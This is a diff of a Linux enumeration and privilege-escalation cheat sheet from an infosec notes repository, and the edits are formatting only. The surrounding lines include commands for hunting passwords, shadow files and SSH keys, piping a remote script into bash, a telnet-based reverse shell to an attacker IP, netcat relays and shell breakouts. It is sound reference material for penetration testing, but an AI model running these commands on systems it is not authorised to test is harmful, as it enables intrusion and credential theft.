@@ -6,10 +6,10 @@ Hack Responsibly.
 Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
 {% endhint %}
 
-TODO: \(issue [\#13](https://github.com/zweilosec/Infosec-Notes/issues/13)\)
+TODO: (issue [#13](https://github.com/zweilosec/Infosec-Notes/issues/13))
 
 * Integrate "[Questions to Ask](enumeration.md#questions-to-ask)" into existing sections
-* Add descriptions \(Keep/expand questions? Or rewrite?\)
+* Add descriptions (Keep/expand questions? Or rewrite?)
 * Clean up
 * Prep code examples for scripting
 * Split debian/redhat/BSD commands into "tabs"
@@ -28,7 +28,7 @@ find / -user $username -ls 2>/dev/null
 find / -group $groupname -ls 2>/dev/null
 ```
 
-### Search bash history for passwords \(pwd search\)
+### Search bash history for passwords (pwd search)
 
 ```bash
 find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
@@ -40,7 +40,7 @@ find . -name .bash_history -exec grep -A 1 '^passwd' {} \;
 find / -name "$pattern" 2>/dev/null
 ```
 
-### Search files in whole filesystem for a string \(case insensitive\)
+### Search files in whole filesystem for a string (case insensitive)
 
 ```bash
 grep -ri "$string" / 2>/dev/null
@@ -54,7 +54,7 @@ grep -ri "$string" / 2>/dev/null
 which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
 ```
 
-### Find UID 0 files \(root execution\)
+### Find UID 0 files (root execution)
 
 ```bash
 /usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\\\; 2>/dev/null
@@ -90,9 +90,9 @@ strings $file
 file $file
 ```
 
-### Find deleted \(unlinked\) files
+### Find deleted (unlinked) files
 
-```text
+```
 lsof +L1
 ```
 
@@ -136,10 +136,10 @@ ps aux --sort pmem
 
 You can run `pspy --help` to learn about the flags and their meaning. The summary is as follows:
 
-* `-p`: enables printing commands to stdout \(enabled by default\)
-* `-f`: enables printing file system events to stdout \(disabled by default\)
-* `-r`: list of directories to watch with Inotify. pspy will watch all subdirectories recursively \(by default, watches /usr, /tmp, /etc, /home, /var, and /opt\).
-* `-d`: list of directories to watch with Inotify. pspy will watch these directories only, not the subdirectories \(empty by default\).
+* `-p`: enables printing commands to stdout (enabled by default)
+* `-f`: enables printing file system events to stdout (disabled by default)
+* `-r`: list of directories to watch with Inotify. pspy will watch all subdirectories recursively (by default, watches /usr, /tmp, /etc, /home, /var, and /opt).
+* `-d`: list of directories to watch with Inotify. pspy will watch these directories only, not the subdirectories (empty by default).
 * `-i`: interval in milliseconds between procfs scans. pspy scans regularly for new processes regardless of Inotify events, just in case some events are not received.
 * `-c`: print commands in different colors. File system events are not colored anymore, commands have different colors based on process UID.
 * `--debug`: prints verbose error messages which are otherwise hidden.
@@ -163,7 +163,7 @@ Some more complex examples:
 
 enumerate info about current processes running from: `/proc/self/status`
 
-`ps -U root -u root ux` View all processes started by a certain user \(`root` in this case\)
+`ps -U root -u root ux` View all processes started by a certain user (`root` in this case)
 
 ## Simple enumeration script
 
@@ -226,10 +226,10 @@ mount -l find / -path “$HOME” -prune -o -path “/proc”�
 
 full linux enumeration:
 
-* [LinEnum.sh](https://github.com/rebootuser/LinEnum) 
+* [LinEnum.sh](https://github.com/rebootuser/LinEnum)&#x20;
 * [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
-Download **and** execute script \(such as LinEnum.sh\) \[from remote host\]: `curl $url/LinEnum.sh | bash`
+Download **and** execute script (such as LinEnum.sh) \[from remote host]: `curl $url/LinEnum.sh | bash`
 
 Locate exploits:
 
@@ -240,15 +240,15 @@ searchsploit $keyword
 searchsploit -x $exploit_num
 ```
 
-enumeration multi-tool: [Sparta](https://sparta.secforce.com/) \(does nmap, hydra, nikto, sqlscan, ssl...\)
+enumeration multi-tool: [Sparta](https://sparta.secforce.com/) (does nmap, hydra, nikto, sqlscan, ssl...)
 
-Semi-automated enumeration all-in-one \(use this!\): [nmapAutomator](https://github.com/21y4d/nmapAutomator)
+Semi-automated enumeration all-in-one (use this!): [nmapAutomator](https://github.com/21y4d/nmapAutomator)
 
 Unix hardening tool that can be used for enumeration: [Bastille](http://bastille-linux.sourceforge.net/)
 
 ## Questions to ask:
 
-TODO: Split debian/redhat/BSD commands up into tabs; Clean up code for scripting \($var, etc\) \(issue [\#13](https://github.com/zweilosec/Infosec-Notes/issues/13)\)
+TODO: Split debian/redhat/BSD commands up into tabs; Clean up code for scripting ($var, etc) (issue [#13](https://github.com/zweilosec/Infosec-Notes/issues/13))
 
 ### Operating System
 
@@ -274,7 +274,7 @@ ls /boot | grep vmlinuz-
 
 What can be learnt from the environmental variables?
 
-```text
+```
 cat /etc/profile
 cat /etc/bashrc
 cat ~/.bash_profile
@@ -286,7 +286,7 @@ set
 
 Is there a printer?
 
-```text
+```
 lpstat -a
 ```
 
@@ -294,23 +294,23 @@ lpstat -a
 
 What services are running? Which service has which user privilege?
 
-```text
+```
 ps aux
 ps -ef
 top
 cat /etc/service
 ```
 
-Which service\(s\) are been running by root? Of these services, which are vulnerable - it's worth a double check!
+Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
 
-```text
+```
 ps aux | grep root
 ps -ef | grep root
 ```
 
 What applications are installed? What version are they? Are they currently running?
 
-```text
+```
 ls -alh /usr/bin/
 ls -alh /sbin/
 dpkg -l
@@ -319,9 +319,9 @@ ls -alh /var/cache/apt/archivesO
 ls -alh /var/cache/yum/
 ```
 
-Any of the service\(s\) settings misconfigured? Are any \(vulnerable\) plugins attached?
+Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
 
-```text
+```
 cat /etc/syslog.conf 
 cat /etc/chttp.conf
 cat /etc/lighttpd.conf
@@ -336,7 +336,7 @@ ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
 
 What jobs are scheduled?
 
-```text
+```
 crontab -l
 ls -alh /var/spool/cron
 ls -al /etc/ | grep cron
@@ -353,7 +353,7 @@ cat /var/spool/cron/crontabs/root
 
 Any plain text usernames and/or passwords?
 
-```text
+```
 grep -i user [filename]
 grep -i pass [filename]
 grep -C 5 "password" [filename]
@@ -362,9 +362,9 @@ find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
 
 ### Communications & Networking
 
-What NIC\(s\) does the system have? Is it connected to another network?
+What NIC(s) does the system have? Is it connected to another network?
 
-```text
+```
 /sbin/ifconfig -a
 cat /etc/network/interfaces
 cat /etc/sysconfig/network
@@ -372,7 +372,7 @@ cat /etc/sysconfig/network
 
 What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
 
-```text
+```
 cat /etc/resolv.conf
 cat /etc/sysconfig/network
 cat /etc/networks
@@ -383,7 +383,7 @@ dnsdomainname
 
 What other users & hosts are communicating with the system?
 
-```text
+```
 lsof -i 
 lsof -i :80
 grep 80 /etc/services
@@ -398,7 +398,7 @@ w
 
 What's cached? IP and/or MAC addresses
 
-```text
+```
 arp -e
 route
 /sbin/route -nee
@@ -406,7 +406,7 @@ route
 
 Is packet sniffing possible? What can be seen? Listen to live traffic
 
-```text
+```
 # tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
 tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
 ```
@@ -415,7 +415,7 @@ Have you got a shell? Can you interact with the system?
 
 * [http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/](http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/)
 
-```text
+```
 nc -lvp 4444    # Attacker. Input (Commands)
 nc -lvp 4445    # Attacker. Ouput (Results)
 telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
@@ -426,14 +426,14 @@ Is port forwarding possible? Redirect and interact with traffic from another vie
 * rinetd - [http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch](http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch)
 * fpipe
 
-```text
+```
 # FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
 FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
 ```
 
 * SSH
 
-```text
+```
 # ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
 ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
 ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
@@ -441,7 +441,7 @@ ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
 
 * mknod backpipe
 
-```text
+```
 # mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
 mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
 mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
@@ -450,7 +450,7 @@ mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 8
 
 Is tunneling possible? Send commands from local machine to remote
 
-```text
+```
 ssh -D 127.0.0.1:9050 -N $username@$ip 
 proxychains ifconfig
 ```
@@ -484,16 +484,16 @@ cat /etc/master.passwd
 #is where password hashes are stored in BSD, not /etc/shadow
 ```
 
-Anything "interesting" in the home directory\(s\)? If it's possible to access
+Anything "interesting" in the home directory(s)? If it's possible to access
 
-```text
+```
 ls -ahlR /root/
 ls -ahlR /home/
 ```
 
 Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
 
-```text
+```
 cat /var/apache2/config.inc
 cat /var/lib/mysql/mysql/user.MYD 
 cat /root/anaconda-ks.cfg
@@ -527,7 +527,7 @@ cat /var/spool/mail/root
 
 Can private-key information be found?
 
-```text
+```
 ls -la ~/.ssh
 ls -la /etc/ssh
 
@@ -564,7 +564,7 @@ find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
 
 What can be found in `/var` ?
 
-```text
+```
 ls -alh /var/log
 ls -alh /var/mail
 ls -alh /var/spool
@@ -576,7 +576,7 @@ cat /var/lib/dhcp3/dhclient.leases
 
 Any settings/files related to web server? Any settings file with database information?
 
-```text
+```
 ls -alhR /var/www/
 ls -alhR /srv/www/htdocs/ 
 ls -alhR /usr/local/www/apache22/data/
@@ -584,11 +584,11 @@ ls -alhR /opt/lampp/htdocs/
 ls -alhR /var/www/html/
 ```
 
-Is there anything in the log file\(s\) \(Could help with "Local File Includes"!\)
+Is there anything in the log file(s) (Could help with "Local File Includes"!)
 
 * [http://www.thegeekstuff.com/2011/08/linux-var-log-files/](http://www.thegeekstuff.com/2011/08/linux-var-log-files/)
 
-```text
+```
 cat /etc/httpd/logs/access_log
 cat /etc/httpd/logs/access.log
 cat /etc/httpd/logs/error_log
@@ -632,7 +632,7 @@ ls -alh /var/log/samba/
 
 If commands are limited, can you break out of the "jail" shell?
 
-```text
+```
 python -c 'import pty;pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
 /bin/sh -i
@@ -640,14 +640,14 @@ echo os.system('/bin/bash')
 
 How are file-systems mounted?
 
-```text
+```
 mount
 df -h
 ```
 
 Are there any unmounted file-systems?
 
-```text
+```
 cat /etc/fstab
 ```
 
@@ -687,7 +687,7 @@ find /dir -xdev \( -nouser -o -nogroup \) -print   # No-owner files
 
 What development tools/languages are installed/supported?
 
-```text
+```
 find / -name perl*
 find / -name python*
 find / -name gcc* 
@@ -696,7 +696,7 @@ find / -name cc
 
 How can files be transferred?
 
-```text
+```
 find / -name wget
 find / -name curl
 find / -name nc*
@@ -708,9 +708,9 @@ find / -name ftp
 #### Researching Vulnerabilities
 
 * [http://www.cvedetails.com](http://www.cvedetails.com)
-* [http://packetstormsecurity.org/files/cve/\[CVE\](http://packetstormsecurity.org/files/cve/[CVE\)\]
-* [http://cve.mitre.org/cgi-bin/cvename.cgi?name=\[CVE\](http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE\)\]
-* [http://www.vulnview.com/cve-details.php?cvename=\[CVE\](http://www.vulnview.com/cve-details.php?cvename=[CVE\)\]
+* [http://packetstormsecurity.org/files/cve/\[CVE\\](http://packetstormsecurity.org/files/cve/\[CVE/)]
+* [http://cve.mitre.org/cgi-bin/cvename.cgi?name=\[CVE\\](http://cve.mitre.org/cgi-bin/cvename.cgi?name=\[CVE\\)]
+* [http://www.vulnview.com/cve-details.php?cvename=\[CVE\\](http://www.vulnview.com/cve-details.php?cvename=\[CVE\\)]
 
 #### Finding exploit code
 
@@ -725,4 +725,3 @@ find / -name ftp
 * [https://seclists.org/fulldisclosure/](https://seclists.org/fulldisclosure/)
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
-
